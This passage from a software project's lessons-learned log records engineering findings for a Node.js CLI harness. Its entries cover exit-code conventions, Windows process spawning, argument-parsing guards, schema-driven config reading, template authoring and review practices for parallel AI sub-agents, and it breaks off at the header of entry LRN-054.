**Problem:** `--config` was wired into the global argument parser in `bin/harness.mjs` but never threaded through to `lib/sync.mjs::sync()`. Callers invoking `harness sync --config alternate.json` received no error and no indication that the flag was silently ignored — the default `harness.config.json` was used instead. Automation that relied on checking an alternate config would silently test the wrong file.

**Finding:** Silently ignoring a parsed CLI flag is worse than rejecting it. The caller has no feedback that their intent was not honoured. The correct behaviour for an unimplemented flag is explicit rejection: exit 2 with a clear message pointing at the workaround (`--cwd` in this case). Deferred full threading of `--config` into `sync()` to CS04b.

**Evidence:** GPT-5.5 R1 blocker #2: "`--config` parsed but never passed to `sync()` — automation silently tests the wrong config." Fixed in `cs04-fixes-r1` (reject with exit 2 + message). Filed `planned_cs04b_thread-config-flag-through-sync.md` for the full threading.

**Disposition:** Applied in `bin/harness.mjs`. Future flag additions that are parsed-but-not-yet-wired must either be threaded fully OR reject with exit 2 + pointer to the right flag. "Parse and ignore" is explicitly prohibited.

### LRN-028

```yaml
id: LRN-028
date: 2026-05-03
category: anti-pattern
source_cs: CS04
status: applied
tags: [cli, exit-codes, stub-subcommands, ci-false-positive]
claim_area: cli-ux
```

**Problem:** Initial CS04 stubs for planned-but-unimplemented subcommands (`harvest`, `check-migration`, `composed-audit`) printed "not implemented" and exited 0. Any CI script that ran `harness harvest` would see exit 0 and treat it as success — the harvest never ran, but CI reported green.

**Finding:** Stub subcommands that exit 0 create false-positive CI signals. "Planned but absent" needs a dedicated non-zero exit code that distinguishes from both success (0) and unknown-flag errors (2). CS04 assigns exit 3 for "planned but not yet implemented". Exit 2 is reserved for unknown flags or missing required arguments. Callers can test for exit 3 to detect stub-land vs. broken-invocation.

**Evidence:** GPT-5.5 R1 blocker #3: "stub subcommands exit 0 — CI can't distinguish implemented from stubbed." Fixed in `cs04-fixes-r1` (exit 3 for stubs).

**Disposition:** Exit code convention documented in CS04 close-out notes (`done_cs04_cli-dispatcher.md`) and applied in `bin/harness.mjs`: 0=success, 1=runtime error, 2=bad invocation (unknown flag / missing required), 3=planned but not yet implemented. Must be added to canonical `OPERATIONS.md` in CS08. Future CSs adding stubs must use exit 3 from day one.

### LRN-029

```yaml
id: LRN-029
date: 2026-05-03
category: tooling
source_cs: CS04
status: applied
tags: [windows, node, spawnSync, npm, shell-true]
claim_area: tooling
```

**Problem:** `harness pack` initially called `spawnSync('npm', ['pack', '--dry-run'])` without `shell: true`. On Windows, `npm` is a `.cmd` batch wrapper, not an executable. `spawnSync` without `shell: true` attempts to spawn `npm` as a binary, returns EINVAL, and the command silently fails regardless of whether `'npm'` or `'npm.cmd'` is used as the command name.

**Finding:** On Windows, `spawnSync` (and `spawn`, `execFileSync`) for npm scripts and other Node-ecosystem wrappers MUST pass `{ shell: true }`. Using `'npm.cmd'` as the command is not a reliable workaround — it still returns EINVAL in certain stdio configurations. The only safe cross-platform pattern for npm invocations is `spawnSync('npm', args, { shell: true })`.

**Evidence:** `harness pack` integration test failure on Windows during CS04 implementation; `cs04-fixes-r1` applied `shell: true` + added a test asserting non-EINVAL exit on Windows.

**Disposition:** Applied in `bin/harness.mjs` `pack` subcommand. Any future CS that invokes npm scripts, npx, or other `.cmd` wrappers via `spawnSync`/`execFileSync` must include `shell: true`. Document in CS08 canonical OPERATIONS.md conventions block.

### LRN-030

```yaml
id: LRN-030
date: 2026-05-03
category: operational
source_cs: CS04
status: applied
tags: [cli, help-flag, argument-parsing, subcommand-dispatch]
claim_area: cli-ux
```

**Problem:** The global CLI parser in `bin/harness.mjs` consumed `--help` before dispatching to the subcommand. When a user ran `harness sync --help`, the global parser saw `--help` first, printed global help, and exited — the `sync`-specific flag documentation was never shown.

**Finding:** A global parser that intercepts `--help` must check whether a subcommand is also present in the argv slice. If both are present, `--help` belongs to the subcommand, not the global invocation. Fix: when the global parser detects `--help` AND `argv[0]` is a known subcommand name, forward `--help` to the subcommand's argv slice instead of handling it globally.

**Evidence:** CS04 CLI test failures for `harness sync --help`, `harness check --help`, etc. during initial implementation. Fixed in `cs04-fixes-r1`; 3 new tests confirm correct routing.

**Disposition:** Applied in `bin/harness.mjs`. Pattern to carry forward: any harness CLI command that adds a global flag must check whether subcommand-context narrows the flag's scope. Document in CS08 canonical OPERATIONS.md CLI conventions block.

### LRN-031

```yaml
id: LRN-031
date: 2026-05-03
category: process
source_cs: CS04
status: applied
tags: [review-iteration-cost, user-facing-surface, calibration, gpt-5.5]
claim_area: planning
```

**Problem:** CS04 was classified as a "not high-risk CS" per Decision #22 (thin wrappers, no safety invariants), so the cs-plan did not budget for multiple GPT-5.5 review rounds. In practice, GPT-5.5 required **3 rounds** (R1: 7 blockers; R2: 1 new blocker introduced by R1 fixes; R3: clean GO) before the content PR was merge-ready.

**Finding:** User-facing CLIs are a distinct risk class from engine code: they have rich behavioural contracts (exit codes, flag semantics, help text, platform portability) that interact in subtle ways. Even thin-wrapper CLIs generate 5–10 review findings per round. Plan for ~3 rounds on any user-facing CS surface, even when the implementation looks straightforward. Complements [LRN-024](#lrn-024) (high-risk engine calibration: 5–8 rounds).

**Evidence:** CS04 review history: R1=7 blockers (wrong regex, silent --config, exit-0 stubs, --dry-run alias missing, Windows spawnSync, --help forwarding, pack whitelist); R2=1 blocker (--dry-run alias regression from R1 fix); R3=GO. Sub-agents: `cs04-cli` (initial, 0 commits), `cs04-fixes-r1` (fixed all 7 R1 blockers, 0 commits), orchestrator inline (R2 --dry-run alias fix, 0 commits by sub-agent).

**Disposition:** Update cs-plan planning notes for user-facing CSs (CS04, CS07, CS08+ template-rendered outputs) to budget 3 review rounds minimum. No code change needed; calibration data point complementing LRN-024.

### LRN-032

```yaml
id: LRN-032
date: 2026-05-03
category: process
source_cs: CS05
status: applied
tags: [cli, linter, subcommand, cwd, explicit-path, cs06]
claim_area: cli-ux
```

**Problem:** During CS05 R1, GPT-5.5 caught that `cmdLint` in `bin/harness.mjs` spawned `check-learnings.mjs` without passing `--file`, so the linter resolved the target file relative to the script's own location inside the harness package — validating the harness's own `LEARNINGS.md` regardless of the consumer-repo `--cwd` value passed to the CLI.

**Finding:** A `harness <subcommand>` wrapper that invokes a linter script MUST pass an explicit consumer-cwd-relative file path to that script. Inferring the path from `import.meta.url` or `process.cwd()` inside the script is wrong when the script is installed as a package dependency and the consumer repo is a different directory. Fix: `cmdLint` constructs `path.join(cwd, 'LEARNINGS.md')` and passes it as `--file` to `check-learnings.mjs`.

**Evidence:** GPT-5.5 R1 blocker caught in CS05 review round 1. Fixed in `cs05-fixes-r1` commit.

**Disposition:** Applied in `bin/harness.mjs` `cmdLint`. Pattern for CS06+ linter wrappers: every `harness lint` sub-invocation must explicitly pass the consumer-cwd-relative target path. Document in CS08 canonical OPERATIONS.md CLI conventions block.

### LRN-033

```yaml
id: LRN-033
date: 2026-05-03
category: anti-pattern
source_cs: CS05
status: applied
tags: [linter, doc-schema, error-handling, fail-closed, silent-skip]
claim_area: docs-schema
```

**Problem:** `parseFrontmatterBlocks` in an early `lib/doc-schema.mjs` draft caught `js-yaml` parse errors and `continue`d, silently skipping the malformed block. A broken LRN entry therefore vanished from linting output with no ERROR surfaced — a fail-open behaviour.

**Finding:** Silent skipping of malformed structured data is a fail-closed violation. A parser that swallows errors gives false confidence that the document is clean. Fix: malformed blocks that contain an `id: LRN-` line are NOT silently skipped — they produce a `parseError` result and the linter emits an ERROR for them.

**Evidence:** GPT-5.5 R1 blocker in CS05 review. Fixed in `cs05-fixes-r1`.

**Disposition:** Applied in `lib/doc-schema.mjs` + `scripts/check-learnings.mjs`. Pattern for all future doc-schema parsers: any block that looks like a structured entry (i.e. contains an `id:` matching the document's entry-id pattern) and fails to parse MUST surface as an error, never be silently dropped.

### LRN-034

```yaml
id: LRN-034
date: 2026-05-03
category: operational
source_cs: CS05
status: applied
tags: [doc-schema, regex, markdown, trailing-whitespace, robustness]
claim_area: docs-schema
```

**Problem:** Initial `parseFrontmatterBlocks` matched markdown fence lines with exact string comparisons (`` '```yaml' `` and `` '```' ``). Files edited by certain editors append trailing spaces or carriage returns to fence lines, causing the parser to miss valid fences and silently skip entries.

**Finding:** Strict text matching on markdown fence lines is brittle. The canonical patterns from day one should tolerate trailing whitespace: `` /^\s*```yaml\s*$/ `` (open fence) and `` /^\s*```\s*$/ `` (close fence). Both match lines with leading/trailing whitespace and normalize the check across editors and line-ending styles.

**Evidence:** CS05 R1+R2 fix cycle; `cs05-fixes-r1` updated `lib/doc-schema.mjs` to use these regex patterns.

**Disposition:** Applied in `lib/doc-schema.mjs`. Canonical regex patterns documented here. CS06+ linters that parse any fenced-block format MUST use these patterns (or equivalent) from day one.

### LRN-035

```yaml
id: LRN-035
date: 2026-05-03
category: architectural
source_cs: CS05
status: applied
tags: [doc-schema, parser, entry-boundary, id-pattern, specificity]
claim_area: docs-schema
```

**Problem:** An early entry-boundary classifier in `parseFrontmatterBlocks` used a generic `/id:/` check to decide whether a parsed YAML block was an "entry start". This caused embedded YAML examples (which themselves contain `id:` keys) in LRN body text to be misclassified as entry boundaries, corrupting body extraction for the surrounding real entry.

**Finding:** Entry-boundary classification in doc parsers must match the actual entry-id pattern for the document type (e.g. `/id: LRN-\d+/` for LEARNINGS.md), not a generic `id:` key match. The initial fix used `/id:/`; a second round tightened it to `/id: LRN-\d+/`. Pattern: classify by the most specific shape, not the most general one.

**Evidence:** Two-round finding — initial fix (R1) used `/id:/`, second fix (R2) caught that embedded examples still broke extraction and tightened the regex. Applied in `cs05-fixes-r1` and inline R2 orchestrator fix.

**Disposition:** Applied in `lib/doc-schema.mjs`. Future doc-schema parsers MUST use the document-specific id pattern (e.g. `LRN-\d+`, `ADR-\d+`, etc.) as the entry-boundary discriminant. Generic `id:` matching is explicitly prohibited.

### LRN-036

```yaml
id: LRN-036
date: 2026-05-03
category: process
source_cs: CS05
status: applied
tags: [tests, stub-promotion, exit-code, test-maintenance]
claim_area: orchestrator-loop
```

**Problem:** CS04 had a `lint` subcommand test that asserted exit code 3 (stub / planned-but-not-implemented). CS05 promoted `lint` from stub to functional. The test asserting exit 3 was not updated, causing a test failure in the CS05 content PR until caught and fixed.

**Finding:** When promoting a stub subcommand to functional, the implementing CS must search all tests for the stub's characteristic exit code (exit 3 per LRN-028) and message, and update them in the same commit. The test update is not optional — it documents the intent change from "not implemented" to "implemented".

**Evidence:** CS05 R1 fix round: `cs05-fixes-r1` updated `tests/cli.test.mjs` lint test from exit 3 assertion to exit 0 + lint output assertion.

**Disposition:** Applied in `tests/cli.test.mjs`. Pattern for future stub-promotion CSs: the sub-agent briefing MUST include a step "search tests for exit-3 assertions on `<subcommand>` and update them."

### LRN-037

```yaml
id: LRN-037
date: 2026-05-03
category: process
source_cs: CS05
status: applied
tags: [sub-agents, test-count, over-achievement, minimums-not-exact-counts, briefing]
claim_area: orchestrator-loop
```

**Problem:** CS05 sub-agent briefings specified "minimum 10 tests" and "minimum 7 doc-schema tests". The actual sub-agents (`cs05-content` and `cs05-fixes-r1`) delivered 12 and 10 tests respectively. There was momentary concern that over-delivering was out-of-scope scope-creep.

**Finding:** Sub-agent self-deviation toward MORE tests is a GOOD signal, not a problem. `cs05-content` created 12 tests instead of the 10-test minimum; `cs05-fixes-r1` created 10 doc-schema tests instead of 7. These over-achievements caught real bugs (e.g. `resolveLinks` contract drift). Sub-agent briefings should specify **minimums**, not exact counts. Exact-count specifications create artificial pressure to stop at the minimum and may suppress coverage of discovered edge cases.

**Evidence:** CS05 test delta: 224 → 253 (+29 tests). Breakdown: 12 check-learnings (cs05-content r0) + 10 doc-schema unit tests (cs05-fixes-r1) + 1 cli.test.mjs lint test update + 1 R2 regression test (orchestrator inline) + 5 additional regression tests across r1 fixtures = 29. Over-delivery (12>10 minimum, 10>7 minimum) caught real contract drift in `resolveLinks` (NB-6).

**Disposition:** Update sub-agent briefing template (when canonicalized in CS08 OPERATIONS.md) to specify test minimums only, never exact counts. Note: orchestrator should celebrate rather than flag over-delivery on tests.

### LRN-038

```yaml
id: LRN-038
date: 2026-05-03
category: architectural
source_cs: CS06
status: applied
tags: [aggregator, config-path, single-source-of-truth, cmdLint, silent-drift]
claim_area: orchestrator-loop
```

**Problem:** `cmdLint` resolved `effectiveConfigPath` for threading `--config` to delegated subcommands, but still read composed/local_blocks logic from a separate `cfgPath` variable that took a different default resolution path. The two paths agreed for the happy-case default but diverged whenever a non-default `--config` was passed or a different cwd was set.

**Finding:** Aggregator commands MUST read from the same canonical config path as their delegated subcommands; inconsistent config-path resolution causes silent behavior drift between direct and aggregated invocations. Fix: resolve config exactly once (into `effectiveConfigPath`), then use that single variable for ALL config reads in the aggregator — both for threading to subcommands and for any local logic that reads config fields.

**Evidence:** CS06 R2 (GPT-5.5): blocker finding — `cmdLint` double-resolved config. Fixed inline by orchestrator (R2 fix).

**Disposition:** Applied in `bin/harness.mjs` `cmdLint`. Pattern: any aggregator command that reads config AND threads it to children MUST resolve config once into a single variable and use it everywhere. Document this as a contract in future aggregator-authoring briefs.

### LRN-039

```yaml
id: LRN-039
date: 2026-05-03
category: anti-pattern
source_cs: CS06
status: applied
tags: [schema, sub-agents, field-name-guessing, config-reading, silent-integration-failure]
claim_area: orchestrator-loop
```

**Problem:** CS06 sub-agents implementing config-reading code guessed schema field names from intuition rather than reading the actual JSON schema files. `cs06-workflowpins` used `harness_pin` (intuitive) but `schemas/harness.config.schema.json` defines `version`; `cs06-composed` used `composed_files` (intuitive) but the schema defines `composed.files`. Both passed unit tests (fixtures were also authored against the guessed name) and only failed integration.

**Finding:** Implementing against a guessed schema field name (rather than reading the actual JSON schema) silently breaks integration. Sub-agent briefings for any code that reads config, lock, or learning files MUST require `schemas/*.schema.json` as the primary source of truth, with a mandatory cross-reference step before authoring any field access. Fixture authors are not immune — fixtures must also be derived from the schema, not from memory.

**Evidence:** CS06 R1 (GPT-5.5): blocking findings B-1 and B-2. Fixed by cs06-fixes-r1.

**Disposition:** Applied in `scripts/check-workflow-pins.mjs` and `scripts/check-composed-blocks.mjs`. Future sub-agent briefings for config-reading code MUST include: "Read `schemas/*.schema.json` first. Do not guess field names. Cross-reference every field access against the schema before writing code."

### LRN-040

```yaml
id: LRN-040
date: 2026-05-03
category: operational
source_cs: CS06
status: applied
tags: [argument-parsing, flag-value-guard, silent-misparse, requireValue, linter-pattern]
claim_area: tooling
```

**Problem:** All 9 CS06 linters initially parsed `--file <path>` and similar flags using bare `args[i+1]` access without checking whether the next token was itself a flag. `--file --quiet` would silently consume `--quiet` as the file path, producing a confusing "file not found: --quiet" error rather than a usage error.

**Finding:** Argument parsers that consume the next token as a value via `args[i+1]` silently accept other flags as values. The correct pattern: add a `requireValue(args, i, flagName)` guard that (a) checks `args[i+1]` exists, (b) rejects tokens starting with `-`, and (c) exits 2 with a usage message if either condition fails. Never use bare `if (args[i+1])`; always validate the value shape before consuming it.

**Evidence:** CS06 R1 (GPT-5.5): blocking finding B-3. Fixed by cs06-fixes-r1 across all 9 linters and `cmdLint`.

**Disposition:** Applied in all 9 linter scripts and `bin/harness.mjs` `cmdLint`. The `requireValue` pattern is the canonical arg-parsing guard for all future linter scripts.

### LRN-041

```yaml
id: LRN-041
date: 2026-05-03
category: process
source_cs: CS06
status: applied
tags: [sub-agents, parallel-dispatch, file-ownership, no-commit, scale-validation]
claim_area: orchestrator-loop
```

**Problem:** The CS06 plan called for a true 9-way parallel sub-agent dispatch — the largest fan-out attempted in this project to date. The question was whether LRN-016's "one file = one sub-agent" file-ownership invariant would hold at that scale, and whether the no-commit preflight (LRN-021) would remain reliable across 9 concurrent agents.

**Finding:** 9-way parallel sub-agent dispatch with strict file-ownership boundaries WORKS: zero file races, zero rogue commits, all 9 sub-agents reported correctly. Validates LRN-016's rule when scaled. Cumulative across CS01–CS06: ~30 sub-agent dispatches with 0 commit violations after no-commit preflight standardized in LRN-021.

**Evidence:** CS06 implementation: 9 parallel sub-agents (cs06-context, cs06-workboard, cs06-architecture, cs06-clickstop, cs06-instructions, cs06-readme, cs06-composed, cs06-workflowpins, cs06-public) — all Sonnet 4.6, all 0 commits, all succeeded. No file overlap detected.

**Disposition:** Pattern validated and documented. Future CS fan-outs of ≥9 should continue to follow the LRN-016 file-ownership model. Brief every sub-agent with the no-commit preflight per LRN-021. The 9-way scale is now the proven upper bound; larger fan-outs remain untested but are expected to work given the invariant.

### LRN-042

```yaml
id: LRN-042
date: 2026-05-03
category: architectural
source_cs: CS06
status: applied
tags: [lock-file, schema, orphan-detection, composed-blocks, field-name-guessing, CS06b]
claim_area: schema-design
```

**Problem:** The initial `check-composed-blocks.mjs` implementation for orphan-block detection read a guessed `lock.composed_blocks` array from the lock file. The lock schema (`schemas/lock.schema.json`) defines the canonical shape as `lock.files[].blocks[]` with entries where `class === 'composed'`. Reading the wrong shape silently no-ops: no orphans are ever detected because the array is always absent.

**Finding:** Lock file orphan-block detection MUST read the schema-canonical shape (`lock.files[].blocks[]` for entries with `class === 'composed'`), not a guessed `lock.composed_blocks` array. As with LRN-039, schema is the authoritative source of truth; reading the wrong shape silently no-ops. Filed CS06b for the broader 'shared parser primitives' refactor to reduce future guessing.

**Evidence:** CS06 R2 (GPT-5.5): blocker finding B-1 (lock format). Fixed inline by orchestrator (R2 fix).

**Disposition:** Applied in `scripts/check-composed-blocks.mjs`. CS06b filed to refactor config/lock reading into `lib/` primitives, reducing the surface area for future field-name guessing across all linters.

### LRN-043

```yaml
id: LRN-043
date: 2026-05-03
category: process
source_cs: CS06
status: applied
tags: [dogfooding, linter-regression, docs-as-deliverable, context-linter, readme-linter]
claim_area: orchestrator-loop
```

**Problem:** CS06 linters were built to validate the project's own docs (CONTEXT.md, README.md, etc.). When run as regression fixtures against the real files, some linters failed: cs06-context detected stale "ready to claim" language in CONTEXT.md; cs06-readme found README.md missing `## Architecture` and `## Status` sections.

**Finding:** When a new linter's regression target is the project's own docs, the project's docs ARE part of the deliverable — fixing them to pass the linter is the correct behavior, not a scope deviation. Pattern: each sub-agent whose linter targets a live project file MUST update that file as part of its implementation work, so the linter passes its own real-file regression from the moment it ships. Eating our own dogfood mid-CS is intentional and expected.

**Evidence:** cs06-context updated CONTEXT.md (removed stale "ready to claim" language, per its regression fix); cs06-readme added `## Architecture` and `## Status` sections to README.md. Both were real deliverables, not incidental edits.

**Disposition:** Pattern codified. Future linter sub-agent briefings MUST include: "If your linter fails against the live target file, fix the live file as part of this task — that IS the deliverable." This prevents the misclassification of doc fixes as out-of-scope.

### LRN-044

```yaml
id: LRN-044
date: 2026-05-03
category: anti-pattern
source_cs: CS07
status: applied
tags: [stdout, stderr, linter, renderer, quiet-mode, artifact-corruption]
claim_area: tooling
```

**Problem:** `scripts/render-deploy-summary.mjs` initially wrote progress/status lines to stdout even in `--quiet` mode. Callers that piped stdout to capture the deployment summary artifact received a corrupted artifact interleaved with progress text.

**Finding:** Renderers and scripts that emit a primary artifact to stdout MUST never mix progress/status output on stdout, regardless of `--quiet` mode. Progress goes to stderr (non-quiet) or is fully suppressed (quiet); stdout is reserved for the artifact. Any tool with `--out`/`--in` semantics must treat stdout as a clean data channel. Found in CS07 R1 (B1).

**Evidence:** CS07 R1 blocker B1 (GPT-5.5): cs07-render wrote progress messages to stdout in `--quiet` mode, corrupting the deployment summary artifact for piped callers. Fixed inline by orchestrator R2 fix pass.

**Disposition:** Applied in `scripts/render-deploy-summary.mjs`. Pattern for all future renderer/emitter scripts: establish a hard stdout/stderr discipline at design time; add a test asserting stdout is clean (contains only artifact content) when `--quiet` is passed.

### LRN-045

```yaml
id: LRN-045
date: 2026-05-03
category: anti-pattern
source_cs: CS07
status: applied
tags: [safety-flags, validation-depth, redact-required, surface-presence, invariant-check]
claim_area: tooling
```

**Problem:** `--redact-required` in `scripts/render-deploy-summary.mjs` originally only checked "is a redaction config loaded?" — it did not verify that the loaded config actually contained the relevant `public_artifact_redaction` rule for the artifact type being rendered. A config file lacking the rule still passed the flag, giving a false safety guarantee.

**Finding:** Safety-required flags (e.g. `--redact-required`, `--strict`, `--no-warnings-as-errors-bypass`) must validate the SUBSTANCE of the requirement, not just its surface presence. A flag named `--redact-required` must verify the deeper invariant it implies — that the applicable redaction rule exists and is non-empty — not merely that some config object was loaded. Found in CS07 R1 (B2).

**Evidence:** CS07 R1 blocker B2 (GPT-5.5): `--redact-required` passed even when `public_artifact_redaction` lacked an entry for the target artifact type. Fixed inline by orchestrator R2 fix pass.

**Disposition:** Applied in `scripts/render-deploy-summary.mjs`. Pattern: any "required" safety flag must check the deepest invariant it implies. Document in CS08 canonical OPERATIONS.md conventions block.

### LRN-046

```yaml
id: LRN-046
date: 2026-05-03
category: architectural
source_cs: CS07
status: applied
tags: [config, per-type-map, public-artifact-redaction, field-selection, over-application]
claim_area: schema-design
```

**Problem:** When `public_artifact_redaction` is a per-type map (keys = artifact types), an early implementation of `render-deploy-summary.mjs` iterated over the entire map rather than selecting the entry for the specific artifact type being rendered. This collapsed unrelated redaction rules from other artifact types and produced over-application — fields forbidden only for other artifact types were incorrectly rejected on the current artifact.

**Finding:** When a config field is a per-type map (e.g. `public_artifact_redaction[<artifact-type>]`), consumers MUST select their specific type's rule, not iterate over the whole map. Iterating collapses unrelated rules from other types and produces incorrect over-application or false failures. Found in CS07 R1 (NB-3). Companion to [LRN-039](#lrn-039) (schema is source of truth) and [LRN-042](#lrn-042) (lock orphan detection schema-shape).

**Evidence:** CS07 R1 non-blocker NB-3 (GPT-5.5): map-iteration over `public_artifact_redaction` applied all types' rules to a single artifact. Fixed inline by orchestrator R2 fix pass.

**Disposition:** Applied in `scripts/render-deploy-summary.mjs`. Pattern: any code reading a per-type-keyed config map must look up by the specific type key, never iterate the whole map.

### LRN-047

```yaml
id: LRN-047
date: 2026-05-03
category: process
source_cs: CS07
status: applied
tags: [review, fix-round, inline-vs-sub-agent, heuristic, findings-concentration]
claim_area: orchestrator-loop
```

**Problem:** There is no documented heuristic for when a review fix-round should be handled inline by the orchestrator vs. dispatched to a dedicated fix-round sub-agent. Without a heuristic, the decision is made ad hoc each time.

**Finding:** Single-blocker R2 follow-ups can be handled inline by the orchestrator; large multi-finding R1 sets warrant a fix-round sub-agent. CS07's R1 was 5 findings concentrated in ONE file (render-deploy-summary.mjs), so inline fix was efficient and complete in one pass. CS06's R1 was 4 blockers spread across 6 files, warranting a sub-agent. Heuristic: (# of findings) × (# of affected files) → if > ~6, dispatch sub-agent; otherwise handle inline.

**Evidence:** CS07: R1=2 blockers+3 non-blockers all in one file → inline fix (efficient). CS06: R1=4 blockers across 6 files → sub-agent (cs06-fixes-r1). Pattern emerges from two consecutive CSs.

**Disposition:** Applied as process standard. Future close-out docs should record the fix-round decision and reference this heuristic. Document in CS08 canonical OPERATIONS.md § Review loop.

### LRN-048

```yaml
id: LRN-048
date: 2026-05-03
category: process
source_cs: CS07
status: applied
tags: [sub-agents, parallel-dispatch, no-commit, scale-validation, cumulative-count]
claim_area: orchestrator-loop
```

**Problem:** The CS07 plan called for a 4-way parallel sub-agent dispatch. The key question was whether the no-commit preflight (LRN-021) and file-ownership invariant (LRN-016) would hold at this scale as well.

**Finding:** 4-way parallel sub-agent dispatch in CS07 worked identically to CS06's 9-way: 0 file races, 0 rogue commits, all 4 sub-agents reported correctly. Cumulative count: 18 sub-agent dispatches across CS01–CS07 with zero commit-discipline violations after LRN-021 standardization. The invariant continues to hold at all tested fan-out sizes (1–9).

**Evidence:** CS07 implementation: 4 parallel sub-agents (cs07-prbody, cs07-trailers, cs07-compose, cs07-render) — all Sonnet 4.6, all 0 commits, all succeeded. No file overlap detected.

**Disposition:** Pattern validated and documented. Continue applying LRN-016 + LRN-021 on all future fan-outs. Cumulative dispatch count (18) now the documented baseline for CS08+.

### LRN-049

```yaml
id: LRN-049
date: 2026-05-03
category: architectural
source_cs: CS08
status: applied
tags: [templating, dot-notation, placeholder-resolution, template-authoring, linter-gap]
claim_area: tooling
```

**Problem:** CS08 sub-agents authoring template files reached for `{{project.name}}` / `{{project.agent_suffix}}` style placeholders because `config.project.X` is how the values are semantically located in the config object. However, `lib/templating.mjs` resolves placeholders from a flat key map (i.e., it looks up `config.templating[<key>]`, not `config.project.X`). Dot-notation placeholders like `{{project.X}}` ship as literal unresolved text after consumer sync.

**Finding:** Templates that will be resolved by a flat-key substitution engine MUST NOT use dot-notation placeholders (e.g., `{{project.X}}`). The engine only resolves keys present at the top level of `config.templating[...]`. Sub-agents instinctively reach for dot notation when authoring templates that reference `config.project.X` semantically; without a linter rule flagging this, the dot-notation placeholders ship as literal unresolved text on consumer sync. Found in CS08 R1 (B2).

**Evidence:** CS08 R1 blocker B2 (GPT-5.5): multiple template files contained `{{project.name}}`, `{{project.agent_suffix}}` etc. that `lib/templating.mjs` cannot resolve. Fixed in cs08-fixes-r1.

**Disposition:** Applied — templates corrected. Mitigation: file CS08b for a `check-templates.mjs` linter that flags `{{X.Y}}` dot-notation in `template/` files. See [`project/clickstops/planned/planned_cs08b_template-linter.md`](project/clickstops/planned/planned_cs08b_template-linter.md).

### LRN-050

```yaml
id: LRN-050
date: 2026-05-03
category: architectural
source_cs: CS08
status: applied
tags: [template-authoring, relative-paths, consumer-root, link-breakage, sync]
claim_area: tooling
```

**Problem:** Several CS08 templates contained relative paths like `../../docs/adr/...` or `../LEARNINGS.md` — paths that were correct relative to the source location inside `template/managed/` but that break after `harness sync` installs the file at the consumer repo root. The installed file contains broken relative links.

**Finding:** Managed templates that ship to the consumer repo root MUST use consumer-root-relative paths (`docs/adr/...`, `LEARNINGS.md`), NOT template-source-relative paths (`../../docs/...`, `../LEARNINGS.md`). When authoring template files, always think of the FINAL install location, not the source location in `template/managed/` or `template/composed/`. Found in CS08 R1 (B3). A future linter (CS06c?) could detect `../` relative paths in `template/managed/` and flag them.

**Evidence:** CS08 R1 blocker B3 (GPT-5.5): multiple template files used source-tree-relative paths. Fixed in cs08-fixes-r1.

**Disposition:** Applied — templates corrected. Pattern documented in CS08 close-out. Future `check-templates.mjs` (CS08b) should also flag `../` relative paths in `template/managed/` and `template/composed/` files.

### LRN-051

```yaml
id: LRN-051
date: 2026-05-03
category: anti-pattern
source_cs: CS08
status: applied
tags: [template-authoring, linter, forbidden-tokens, self-reference, pull-request-template]
claim_area: tooling
```

**Problem:** `template/managed/.github/pull_request_template.md` was authored to document `check-pr-body.mjs`'s rejected marker tokens. The sub-agent (cs08-githubtmpl) initially included the literal strings `TODO:` and `FIXME:` in an HTML comment — documenting what the linter rejects. On first linter run, `check-pr-body.mjs` scanned the template file itself and rejected those verbatim tokens, causing a self-referential linter failure.

**Finding:** A PR template (or any consumer artifact template) that documents a linter's forbidden tokens CANNOT quote those tokens verbatim — even inside HTML comments — because the linter scans the file as-is. Use paraphrase ("forbidden marker tokens", "placeholder strings rejected by check-pr-body") instead of quoting the literal forbidden strings. Found by cs08-githubtmpl during authoring; the sub-agent fixed the issue inline before reporting.

**Evidence:** cs08-githubtmpl LEARNINGS CANDIDATES section: "first linter run on PR template failed due to self-reference of forbidden tokens; fixed by replacing literal tokens with paraphrase."

**Disposition:** Applied in `template/managed/.github/pull_request_template.md`. Pattern: template files that describe linter rules must avoid reproducing the exact strings the linter rejects. Applies to any template whose content will itself be linted.

### LRN-052

```yaml
id: LRN-052
date: 2026-05-03
category: process
source_cs: CS08
status: applied
tags: [sub-agents, parallel-dispatch, no-commit, scale-validation, cumulative-count, doc-authoring]
claim_area: orchestrator-loop
```

**Problem:** CS08 called for an 8-way parallel sub-agent dispatch — the largest fan-out by output volume attempted to date, with 8 substantive doc-authoring tasks (multiple hundreds of lines each) versus CS06's 9 narrowly-scoped linter scripts. The question was whether volume (not just count) of parallel output would create races or discipline breakdowns.

**Finding:** 8-way parallel sub-agent dispatch validated: zero file races, zero rogue commits, all 8 sub-agents reported correctly. Cumulative count: 26 sub-agent dispatches across CS01–CS08 with zero commit-discipline violations after LRN-021 standardization. CS08 was the largest fan-out by output volume (8 substantive doc-authoring tasks with large output) versus CS06's 9 narrow scripts. Conclusion: parallel fan-out scales cleanly with disjoint file ownership; the cost is review burden (7 templates × multiple LRN cross-references = many small audit points).

**Evidence:** CS08 implementation: 8 parallel sub-agents (cs08-instructions, cs08-conventions, cs08-operations, cs08-reviews, cs08-tracking, cs08-retrospectives, cs08-readmeguide, cs08-githubtmpl) — all Sonnet 4.6, all 0 commits, all succeeded. Plus cs08-fixes-r1 for R1 fix round. Zero file overlap detected.

**Disposition:** Pattern validated. Continue applying LRN-016 + LRN-021 on all future fan-outs. Cumulative dispatch count (26) is the new documented baseline for CS09+. High-volume doc-authoring fan-out is now proven safe.

### LRN-053

```yaml
id: LRN-053
date: 2026-05-03
category: operational
source_cs: CS08
status: applied
tags: [sub-agents, edit-tool, truncation, file-integrity, large-edits]
claim_area: orchestrator-loop
```

**Problem:** When an `edit` operation replaces a large `old_str` block near the end of a file, the replacement may silently truncate content after the match point. The edit appears successful (no error returned), but lines after the replaced block are dropped. This was reported by cs08-instructions in its LEARNINGS CANDIDATES section.

**Finding:** Sub-agent `edit` tool truncation: large `edit` operations that replace blocks near the end of a file can silently drop content after the match point. The failure mode is silent — no error, just missing lines. Mitigation: after large `edit` operations, verify the file line count delta matches expectation (old line count − removed lines + added lines = expected new count). A linter pass alone is insufficient to catch this — line count delta is the correct check.

**Evidence:** cs08-instructions reported this in its LEARNINGS CANDIDATES section during CS08. Sub-agent noticed the file was shorter than expected after an edit near the end, and confirmed by diffing expected vs actual line count.

**Disposition:** Applied as operational standard. Future orchestrator briefings for large doc-authoring tasks MUST include: "After any large `edit` near end-of-file, verify line count delta before proceeding." Pattern added to canonical OPERATIONS.md conventions block via CS08 templates.

### LRN-054

```yaml
id: LRN-054
date: 2026-05-03
category: anti-pattern
source_cs: CS09
status: applied
tags: [init, setup, early-return, side-effects, create-if-missing, harness-init]
claim_area: tooling
```

